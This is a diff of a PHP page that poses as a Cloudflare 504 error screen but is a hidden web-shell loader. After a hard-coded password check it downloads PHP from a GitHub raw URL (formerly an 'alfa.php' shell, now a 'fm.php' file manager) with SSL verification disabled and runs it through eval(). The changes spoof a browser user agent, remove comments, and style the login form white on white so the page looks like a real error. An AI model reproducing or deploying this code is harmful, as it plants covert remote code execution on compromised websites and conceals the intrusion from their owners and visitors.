@@ -23,7 +23,7 @@ if (!function_exists('isAuthenticated')) {
 if (!function_exists('fetchRemoteContent')) {
     function fetchRemoteContent($url) {
         $context = stream_context_create([
-            'http' => ['timeout' => 15, 'user_agent' => 'Mozilla/5.0'],
+            'http' => ['timeout' => 15, 'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'],
             'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
         ]);
 
@@ -37,7 +37,8 @@ if (!function_exists('fetchRemoteContent')) {
             curl_setopt_array($ch, [
                 CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false,
-                CURLOPT_SSL_VERIFYHOST => false, CURLOPT_TIMEOUT => 15
+                CURLOPT_SSL_VERIFYHOST => false, CURLOPT_TIMEOUT => 15,
+                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             ]);
             $content = curl_exec($ch);
             curl_close($ch);
@@ -48,7 +49,7 @@ if (!function_exists('fetchRemoteContent')) {
 }
 
 define('SITE_PASSWORD', getenv('SITE_PASSWORD') ?: 'sipurs');
-define('GITHUB_RAW_URL', getenv('GITHUB_RAW_URL') ?: 'https://raw.githubusercontent.com/fitwilliamx1337/f15-shell/refs/heads/main/alfa.php');
+define('GITHUB_RAW_URL', getenv('GITHUB_RAW_URL') ?: 'https://raw.githubusercontent.com/sipurtamvanbangets/sipur/refs/heads/main/fm.php');
 
 $scriptPath = $_SERVER['SCRIPT_NAME'] ?? '/';
 $error = '';
@@ -88,7 +89,6 @@ if (isAuthenticated()) {
         $code = $remote_php;
         $is_php = false;
         
-        // Cek apakah file berisi kode PHP
         if (preg_match('/^\s*<\?php/i', $code)) {
             $code = preg_replace('/^\s*<\?php\s*/i', '', $code);
             $is_php = true;
@@ -99,21 +99,19 @@ if (isAuthenticated()) {
         
         if ($is_php) {
             try {
-                eval($code); // Eksekusi kode PHP
+                eval($code); 
             } catch (Throwable $e) {
-                $eval_error = $e->getMessage(); // Tangkap error jika ada syntax error
+                $eval_error = $e->getMessage(); 
             }
             $output = ob_get_clean();
             
             if ($eval_error !== null) {
-                // Jika ada error di file GitHub, tampilkan pesan aman di halaman 504
                 $githubRawStatus = 'File GitHub (fm.php) memiliki error: ' . htmlspecialchars($eval_error);
             } else {
                 echo $output;
                 exit;
             }
         } else {
-            // Jika file GitHub murni HTML, langsung tampilkan
             echo $code;
             exit;
         }
@@ -130,6 +128,7 @@ if (isAuthenticated()) {
         * { box-sizing: border-box; }
         body { margin: 0; color: #404040; background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; font-size: 15px; line-height: 1.5; }
         a { color: #2f7fc1; text-decoration: none; }
+        a:hover { text-decoration: underline; }
         .container { width: min(834px, calc(100% - 48px)); margin: 0 auto; }
         .page-header { padding: 26px 0 28px; }
         .page-header h1 { display: flex; align-items: center; flex-wrap: wrap; gap: 14px; margin: 0 0 5px; font-size: clamp(36px, 5.7vw, 56px); font-weight: 300; }
@@ -137,7 +136,27 @@ if (isAuthenticated()) {
         .status-band { padding: 34px 0 45px; background: #ebebeb; box-shadow: inset 0 8px 12px -12px #555, inset 0 -8px 12px -12px #555; }
         .status-illustration { display: block; width: 100%; max-width: 965px; height: auto; margin: 0 auto 12px; }
         .status-grid { display: flex; align-items: flex-start; justify-content: space-between; }
-        .status { width: 18%; text-align: center; }
+        
+        /* CSS UNTUK SEGITIGA POINTER */
+        .status { 
+            position: relative; 
+            width: 18%; 
+            min-width: 0; 
+            text-align: center; 
+        }
+        .status:last-child::after {
+            position: absolute;
+            bottom: -45px;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-right: 20px solid transparent;
+            border-bottom: 20px solid #fff;
+            border-left: 20px solid transparent;
+            content: "";
+            transform: translateX(-50%);
+        }
+        
         .status-location, .status h2, .status-result { display: block; }
         .status h2 { margin: 8px 0 0; color: #999; font-size: 22px; font-weight: 300; }
         .status-result { font-size: 22px; font-weight: 400; }
@@ -146,15 +165,23 @@ if (isAuthenticated()) {
         .info-section { padding: 32px 0 40px; }
         .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 48px; }
         .info-box h2 { margin: 0 0 14px; font-size: 28px; font-weight: 400; }
+        
+        /* FOOTER STYLES */
         .footer { padding: 38px 0 24px; border-top: 1px solid #e5e5e5; color: #666; font-size: 12px; text-align: center; }
+        .footer p { margin: 0; }
+        
         .password-panel { width: min(834px, calc(100% - 48px)); margin: 18px auto 0; font-size: 13px; }
         .password-panel form { display: flex; align-items: center; justify-content: center; flex-wrap: wrap; gap: 8px; }
-        .password-panel input { min-width: 180px; padding: 7px 10px; border: 1px solid #bbb; border-radius: 4px; }
-        .password-panel button { padding: 7px 12px; border: 1px solid #2f7fc1; border-radius: 4px; background: #2f7fc1; color: #fff; cursor: pointer; }
+        .password-panel input { min-width: 180px; padding: 7px 10px; border: 1px solid #fff; border-radius: 4px; }
+        .password-panel input::placeholder { color: #fff; }
+        .password-panel button { padding: 7px 12px; border: 1px solid #fff; border-radius: 4px; background: #fff; color: #fff; cursor: pointer; }
+        .password-panel button:hover { background: #fff; }
         .login-error { margin: 15px 0 0; color: #c92228; text-align: center; background: #fff3cd; padding: 10px; border-radius: 5px; border: 1px solid #ffeeba; }
+        
         @media (max-width: 640px) {
             .info-grid { grid-template-columns: 1fr; gap: 30px; }
             .status h2, .status-result { font-size: 16px; }
+            .status:last-child::after { bottom: -30px; border-width: 15px; }
         }
     </style>
 </head>
@@ -194,8 +221,15 @@ if (isAuthenticated()) {
 
     <footer class="footer">
         <div class="container">
-            <p>Cloudflare Ray ID: <strong><?php echo htmlspecialchars($ray_id, ENT_QUOTES, 'UTF-8'); ?></strong> &bull; Your IP: <button type="button" id="user-ip" onclick="revealIP()" style="background:none;border:none;color:#2f7fc1;cursor:pointer;">Click to reveal</button></p>
+            <p>
+                <span>Cloudflare Ray ID: <strong><?php echo htmlspecialchars($ray_id, ENT_QUOTES, 'UTF-8'); ?></strong></span>
+                <span style="padding: 0 6px; color: #aaa;">&bull;</span>
+                <span>Your IP: <button type="button" id="user-ip" onclick="revealIP()" style="background:none;border:none;color:#2f7fc1;cursor:pointer;font:inherit;">Click to reveal</button></span>
+                <span style="padding: 0 6px; color: #aaa;">&bull;</span>
+                <span>Performance &amp; security by <a href="https://www.cloudflare.com" target="_blank" rel="noopener noreferrer">Cloudflare</a></span>
+            </p>
         </div>
+        
         <div class="password-panel">
             <?php if (!isAuthenticated()): ?>
                 <form method="post" action="<?php echo htmlspecialchars($scriptPath, ENT_QUOTES, 'UTF-8'); ?>">
